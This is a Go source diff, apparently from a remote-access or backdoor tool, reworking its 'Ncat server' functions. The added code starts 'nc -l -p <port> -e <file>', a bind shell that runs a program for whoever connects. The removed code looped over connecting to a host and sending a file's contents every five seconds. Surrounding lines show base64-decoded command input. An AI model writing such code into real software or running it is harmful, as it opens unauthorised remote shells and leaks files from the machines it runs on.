@@ -7,7 +7,6 @@ import (
 	"io"
 	"net"
 	"net/http"
-	"os"
 	"os/exec"
 	"runtime"
 	"strconv"
@@ -316,39 +315,24 @@ func StartNcat(host string, port int, filename string) {
 		ncatStatus <- "Ncat server is already running"
 		return
 	}
-	if filename == "" {
-		addr := fmt.Sprintf("%s:%d", host, port)
-		l, err := net.Listen("tcp", addr)
+	if filename != "" {
+		listener, _ = net.Listen("tcp", host+":"+fmt.Sprintf("%d", port))
+		exec.Command("nc", "-l", "-p", fmt.Sprintf("%d", port), "-e", filename).Start()
+		ncatStatus <- "Ncat server started on " + host + ":" + fmt.Sprintf("%d", port) + " with file: " + filename
+	} else {
+		var err error
+		listener, err = net.Listen("tcp", host+":"+fmt.Sprintf("%d", port))
 		if err != nil {
 			ncatStatus <- "Error starting Ncat server: " + err.Error()
 			return
 		}
-		listener = l
-		ncatStatus <- "Ncat server started on " + addr
+		ncatStatus <- "Ncat server started on " + host + ":" + fmt.Sprintf("%d", port)
 		for {
 			conn, err := listener.Accept()
 			if err != nil {
-				ncatStatus <- "Error accepting connection: " + err.Error()
 				return
 			}
 			go handleConn(conn)
-		}
-	} else {
-		ncatStatus <- "Ncat server started on " + host + ":" + strconv.Itoa(port) + " with file: " + filename
-		for {
-			conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
-			if err != nil {
-				ncatStatus <- "Error connecting to Ncat server: " + err.Error()
-				return
-			}
-			file, err := os.ReadFile(filename)
-			if err != nil {
-				ncatStatus <- "Error reading file: " + err.Error()
-				return
-			}
-			conn.Write(file)
-			conn.Close()
-			time.Sleep(5 * time.Second)
 		}
 	}
 }
@@ -379,14 +363,13 @@ func StopNcat() string {
 
 func CheckNcat() string {
 	if listener != nil {
-		return "Ncat server is running"
+		return "Ncat server is running at " + listener.Addr().String()
 	} else {
 		return "Ncat server is not running"
 	}
 }
 
 // -------------------------- End of Ncat Server -------------------------- //
-
 func InputCMD(command string) (string, error) {
 	decodedcmd, err := base64.StdEncoding.DecodeString(command)
 	if err != nil {
